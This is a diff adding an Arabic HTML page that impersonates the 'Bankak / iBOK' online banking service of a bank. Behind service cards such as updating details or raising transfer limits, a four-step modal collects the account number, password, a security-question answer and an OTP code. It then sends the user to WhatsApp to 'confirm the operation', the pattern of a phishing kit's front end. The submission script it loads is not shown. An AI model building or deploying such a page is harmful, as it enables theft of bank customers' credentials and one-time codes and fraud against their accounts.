@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>خدمات بنكك أونلاين - iBOK</title>
+    <!-- CSS الخارجية -->
+    <link rel="stylesheet" href="style.css">
+    <!-- FontAwesome للأيقونات -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+
+    <!-- Header / رأس الصفحة -->
+    <header class="header">
+        <div class="header-right">
+            <div class="ibok-title">iBOK | أي بوك</div>
+            <div class="ibok-subtitle">الخدمات المصرفية عبر الإنترنت</div>
+        </div>
+
+        <div class="header-center">
+            <div class="bankak-logo-text">
+                <span class="bankak-ar">بـنـكـك</span>
+                <span class="bankak-en">BANKAK</span>
+            </div>
+        </div>
+
+        <div class="header-left">
+            <div class="header-badge">خدمات بنكك أونلاين</div>
+        </div>
+    </header>
+
+    <!-- Main Container -->
+    <main class="container">
+        
+        <!-- Welcome Hero Banner -->
+        <section class="welcome-banner">
+            <h1 class="welcome-title">مرحباً بكم في خدمات بنكك أونلاين</h1>
+            <div class="welcome-subtitle-en">Bankak Online</div>
+            <p class="welcome-text">الرجاء الاختيار من الخدمات المقدمة أدناه</p>
+        </section>
+
+        <!-- Services Grid Cards -->
+        <section class="services-grid" id="servicesGrid">
+            
+            <div class="service-card" onclick="openServiceModal('update_info', 'تحديث البيانات')">
+                <div class="service-icon"><i class="fas fa-user-edit"></i></div>
+                <div class="service-name">تحديث البيانات</div>
+            </div>
+
+            <div class="service-card" onclick="openServiceModal('raise_limit', 'رفع سقف التحويلات اليومية')">
+                <div class="service-icon"><i class="fas fa-chart-line"></i></div>
+                <div class="service-name">رفع سقف التحويلات اليومية</div>
+            </div>
+
+            <div class="service-card" onclick="openServiceModal('wrong_transfer', 'التحويلات الخاطئة')">
+                <div class="service-icon"><i class="fas fa-exchange-alt"></i></div>
+                <div class="service-name">التحويلات الخاطئة</div>
+            </div>
+
+            <div class="service-card" onclick="openServiceModal('fx_services', 'خدمات العملات الأجنبية')">
+                <div class="service-icon"><i class="fas fa-dollar-sign"></i></div>
+                <div class="service-name">خدمات العملات الأجنبية</div>
+            </div>
+
+            <div class="service-card" onclick="openServiceModal('statement', 'كشف الحساب')">
+                <div class="service-icon"><i class="fas fa-file-invoice"></i></div>
+                <div class="service-name">كشف الحساب</div>
+            </div>
+
+            <div class="service-card" onclick="openServiceModal('virtual_visa', 'بطاقة فيزا افتراضية')">
+                <div class="service-icon"><i class="fas fa-credit-card"></i></div>
+                <div class="service-name">بطاقة فيزا افتراضية</div>
+            </div>
+
+            <div class="service-card" onclick="openServiceModal('accounts', 'حساب جاري وحساب مميز')">
+                <div class="service-icon"><i class="fas fa-university"></i></div>
+                <div class="service-name">حساب جاري وحساب مميز</div>
+            </div>
+
+            <div class="service-card" onclick="openServiceModal('security_questions', 'إدارة أسئلة الأمان')">
+                <div class="service-icon"><i class="fas fa-shield-alt"></i></div>
+                <div class="service-name">إدارة أسئلة الأمان</div>
+            </div>
+
+        </section>
+
+    </main>
+
+    <!-- Modal Fullscreen Overlay -->
+    <div class="modal-overlay" id="modalOverlay">
+        <div class="modal-content">
+            
+            <div class="modal-header">
+                <h2 id="modalTitle">تفاصيل الخدمة</h2>
+                <button class="close-btn" onclick="closeModal()">&times;</button>
+            </div>
+
+            <div class="step-indicator" id="stepIndicator">الخطوة 1 من 4</div>
+
+            <!-- STEP 1: Specific Service Form -->
+            <div class="step-panel active" id="step1">
+                <div id="dynamicFormContainer"></div>
+                <button type="button" class="btn btn-primary" onclick="goToStep(2)">متابعة إلى تسجيل الدخول</button>
+            </div>
+
+            <!-- STEP 2: Login Details -->
+            <div class="step-panel" id="step2">
+                <h3 style="text-align:center; color: var(--primary-color); margin-bottom: 20px;">تسجيل الدخول للحساب</h3>
+                
+                <div class="form-group">
+                    <label>رقم الحساب</label>
+                    <input type="number" id="accountNumber" class="form-control" placeholder="">
+                </div>
+
+                <div class="form-group">
+                    <label>كلمة السر</label>
+                    <input type="password" id="password" class="form-control" placeholder="">
+                </div>
+
+                <div class="btn-group">
+                    <button type="button" class="btn btn-secondary" onclick="goToStep(1)">السابق</button>
+                    <button type="button" class="btn btn-primary" onclick="goToStep(3)">التالي: أسئلة الأمان</button>
+                </div>
+            </div>
+
+            <!-- STEP 3: Security Questions -->
+            <div class="step-panel" id="step3">
+                <h3 style="text-align:center; color: var(--primary-color); margin-bottom: 20px;">التحقق من أسئلة الأمان</h3>
+
+                <div class="form-group">
+                    <label>اختر سؤال الأمان</label>
+                    <select id="secQuestionSelect" class="form-control">
+                        <option value="">-- اختر السؤال --</option>
+                        <option value="1">ما هو اسم ابن عمك الأول؟</option>
+                        <option value="2">ما كان لقبك أثناء الطفولة؟</option>
+                        <option value="3">في أي سنة تزوجت؟</option>
+                        <option value="4">في أي مدينة ولدت؟</option>
+                        <option value="5">في أي سنة تخرجت من الجامعة؟</option>
+                        <option value="6">اسم مؤلفك المفضل؟</option>
+                        <option value="7">اسم الشركة المصنعة للسيارة المفضلة لديك؟</option>
+                        <option value="8">أي فيلم هو المفضل لديك؟</option>
+                        <option value="9">اسم صديق في الطفولة؟</option>
+                        <option value="10">في أي عام حصلت على رخصة القيادة الخاصة بك؟</option>
+                        <option value="11">العلامة التجارية لأول تلفزيون خاص بك؟</option>
+                        <option value="12">اسم فريق كرة القدم المفضل لديك؟</option>
+                        <option value="13">ما هو اسم المدرسة التي التحقت بها؟</option>
+                        <option value="14">اسم أول بلد أجنبي قمت بزيارته؟</option>
+                        <option value="15">ما هي ماركة سيارتك الأولي؟</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label>إجابة سؤال الأمان</label>
+                    <input type="text" id="secAnswer" class="form-control" placeholder="">
+                </div>
+
+                <div class="btn-group">
+                    <button type="button" class="btn btn-secondary" onclick="goToStep(2)">السابق</button>
+                    <button type="button" class="btn btn-primary" onclick="goToStep(4)">التالي: رمز OTP</button>
+                </div>
+            </div>
+
+            <!-- STEP 4: OTP Step -->
+            <div class="step-panel" id="step4">
+                <h3 style="text-align:center; color: var(--primary-color); margin-bottom: 10px;">إدخال رمز التحقق OTP</h3>
+                <p style="text-align: center; color: #666; margin-bottom: 15px;">تم إرسال رمز التحقق إلى رقم الشريحة أو البريد الإلكتروني المسجل</p>
+
+                <div class="otp-timer-box">
+                    الزمن المتبقي للرمز: <span id="otpTimerDisplay">60:00</span>
+                </div>
+
+                <div class="form-group">
+                    <label>رمز التحقق (OTP)</label>
+                    <input type="text" id="otpInput" class="form-control" placeholder="" style="text-align: center; letter-spacing: 4px; font-size: 20px;">
+                </div>
+
+                <div class="btn-group">
+                    <button type="button" class="btn btn-secondary" onclick="goToStep(3)">السابق</button>
+                    <button type="button" class="btn btn-primary" onclick="submitFinalRequest()">تأكيد وإرسال الطلب</button>
+                </div>
+            </div>
+
+            <!-- STEP 5: Success Screen -->
+            <div class="step-panel" id="step5">
+                <div class="success-screen">
+                    <i class="fas fa-check-circle success-icon"></i>
+                    <h2>تم تقديم الطلب بنجاح!</h2>
+                    <p>يرجى المتابعة عبر الواتساب لتأكيد العملية واستكمال التنفيذ.</p>
+                    <a href="#" id="whatsappBtn" target="_blank" class="whatsapp-btn">
+                        <i class="fab fa-whatsapp"></i> تواصل عبر الواتساب لتأكيد العملية
+                    </a>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- Footer / التذييل -->
+    <footer class="footer">
+        <p>جميع الحقوق محفوظة &copy; 2026 - خدمات بنكك أونلاين</p>
+        <a href="https://wa.me/" target="_blank" class="footer-whatsapp">
+            <i class="fab fa-whatsapp"></i> الدعم الفني عبر الواتساب
+        </a>
+    </footer>
+
+    <!-- JavaScript الخارجي -->
+    <script src="script.js"></script>
+</body>
+</html>
